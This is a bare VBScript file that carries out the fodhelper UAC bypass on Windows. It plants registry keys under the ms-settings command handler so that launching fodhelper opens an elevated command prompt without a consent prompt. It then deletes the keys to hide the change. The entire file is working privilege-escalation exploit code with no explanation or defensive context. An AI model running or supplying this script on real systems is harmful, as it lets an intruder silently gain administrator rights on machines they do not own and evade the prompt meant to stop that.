Dim s:Set s=WScript.CreateObject("WScript.Shell")
s.Run "reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d a /f",0,true
s.Run "reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /t REG_SZ /d cmd /f",0,true
s.Run "fodhelper"
WScript.Sleep 3000
s.Run "reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /va /f",0,true
